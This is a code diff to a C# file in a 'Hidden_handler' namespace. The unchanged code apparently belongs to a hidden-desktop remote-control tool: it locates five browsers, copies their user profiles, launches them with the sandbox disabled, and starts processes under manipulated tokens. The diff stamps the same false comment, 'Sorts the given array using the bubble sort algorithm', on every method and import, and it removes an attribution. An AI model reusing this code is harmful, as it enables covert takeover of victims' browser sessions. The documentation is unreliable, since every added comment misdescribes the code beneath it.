@@ -19,6 +19,12 @@ namespace Hidden_handler
         {
             this.DesktopName = DesktopName;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll")]
         private static extern bool CreateProcess(
          string lpApplicationName,
@@ -64,6 +70,11 @@ namespace Hidden_handler
             public int dwThreadId;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartExplorer() 
         {
             uint neverCombine = 2;
@@ -90,6 +101,11 @@ namespace Hidden_handler
             return CreateProc(@"C:\Windows\explorer.exe");
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string GetOperaPath()
         {
             const string basePath = @"SOFTWARE\Clients\StartMenuInternet";
@@ -119,6 +135,11 @@ namespace Hidden_handler
             return null;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string GetBravePath()
         {
             var path = Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
@@ -130,7 +151,11 @@ namespace Hidden_handler
             return path;
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string GetOperaGXPath()
         {
             const string basePath = @"SOFTWARE\Clients\StartMenuInternet";
@@ -160,7 +185,11 @@ namespace Hidden_handler
             return null;
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string getChromePath()
         {
 
@@ -173,6 +202,11 @@ namespace Hidden_handler
             return path;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string GetEdgePath()
         {
             string edgeRegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe";
@@ -192,6 +226,12 @@ namespace Hidden_handler
 
             return null;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public string GetFirefoxPath()
         {
             string firefoxRegistryPath = @"SOFTWARE\Mozilla\Mozilla Firefox";
@@ -224,6 +264,12 @@ namespace Hidden_handler
             }
             return null;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartChrome() 
         {
             string dataDir = @"C:\ChromeAutomationData";
@@ -235,6 +281,11 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir="+dataDir);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartOpera()
         {
             string dataDir = @"C:\OperaAutomationData";
@@ -246,6 +297,11 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartOperaGX()
         {
             string dataDir = @"C:\OperaGXAutomationData";
@@ -257,6 +313,11 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartBrave()
         {
             string dataDir = @"C:\BraveAutomationData";
@@ -268,6 +329,11 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartEdge()
         {
             string dataDir = @"C:\EdgeAutomationData";
@@ -279,6 +345,11 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool StartFirefox()
         {
             string dataDir = @"C:\FirefoxAutomationData";
@@ -290,6 +361,11 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " -no-remote -profile " + dataDir);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> CloneChrome()
         {
             try
@@ -313,6 +389,11 @@ namespace Hidden_handler
             return false;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> CloneOperaGX()
         {
             try
@@ -336,6 +417,11 @@ namespace Hidden_handler
             return false;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> CloneOpera()
         {
             try
@@ -359,6 +445,11 @@ namespace Hidden_handler
             return false;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> CloneBrave()
         {
             try
@@ -382,6 +473,11 @@ namespace Hidden_handler
             return false; 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> CloneFirefox()
         {
             try
@@ -411,6 +507,11 @@ namespace Hidden_handler
             return false;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> CloneEdge()
         {
             try
@@ -434,6 +535,11 @@ namespace Hidden_handler
             return false;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         static string RecursiveFileSearch(string currentDirectory, string targetFileName)
         {
             string targetFilePath = Path.Combine(currentDirectory, targetFileName);
@@ -451,6 +557,12 @@ namespace Hidden_handler
             }
             return null;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task CopyDirAsync(string sourceDir, string destinationDir)
         {
             await CopyDirectoriesAsync(sourceDir, destinationDir);
@@ -459,6 +571,11 @@ namespace Hidden_handler
             await CopyFilesInParallelAsync(files, sourceDir, destinationDir, maxParallelism: 10); // Set your desired parallelism limit
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task CopyDirectoriesAsync(string sourceDir, string destinationDir)
         {
             IEnumerable<string> directories = Directory.EnumerateDirectories(sourceDir, "*", SearchOption.AllDirectories);
@@ -472,6 +589,11 @@ namespace Hidden_handler
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static async Task CopyFilesInParallelAsync(IEnumerable<string> files, string sourceDir, string destinationDir, int maxParallelism)
         {
             var semaphore = new SemaphoreSlim(maxParallelism);
@@ -497,6 +619,11 @@ namespace Hidden_handler
             await Task.WhenAll(copyTasks);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool CreateProc(string filePath)
         {
             STARTUPINFO si = new STARTUPINFO();
@@ -520,8 +647,11 @@ namespace Hidden_handler
     class _ProcessHelper
     {
 
-        //thanks to oz solomon
-        //https://stackoverflow.com/questions/11169431/how-to-start-a-new-process-without-administrator-privileges-from-a-process-with
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static bool RunAsRestrictedUser(string fileName, string DesktopName)
         {
             if (string.IsNullOrWhiteSpace(fileName))
@@ -564,6 +694,12 @@ namespace Hidden_handler
                 CloseHandle(hRestrictedToken);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static bool GetRestrictedSessionUserToken(out IntPtr token)
         {
             token = IntPtr.Zero;
@@ -685,27 +821,62 @@ namespace Hidden_handler
             Open = 1
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("advapi32", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
         private static extern bool SaferCreateLevel(SaferScope scope, SaferLevel level, SaferOpenFlags openFlags, out IntPtr pLevelHandle, IntPtr lpReserved);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("advapi32", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
         private static extern bool SaferComputeTokenFromLevel(IntPtr LevelHandle, IntPtr InAccessToken, out IntPtr OutAccessToken, int dwFlags, IntPtr lpReserved);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("advapi32", SetLastError = true)]
         private static extern bool SaferCloseLevel(IntPtr hLevelHandle);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         private static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool CloseHandle(IntPtr hObject);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static bool SafeCloseHandle(IntPtr hObject)
         {
             return (hObject == IntPtr.Zero) ? true : CloseHandle(hObject);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr LocalFree(IntPtr hMem);
 
@@ -742,6 +913,11 @@ namespace Hidden_handler
             MaxTokenInfoClass
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern Boolean SetTokenInformation(
             IntPtr TokenHandle,
@@ -751,6 +927,11 @@ namespace Hidden_handler
 
         const uint SE_GROUP_INTEGRITY = 0x00000020;
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         static extern bool CreateProcessAsUser(
             IntPtr hToken,
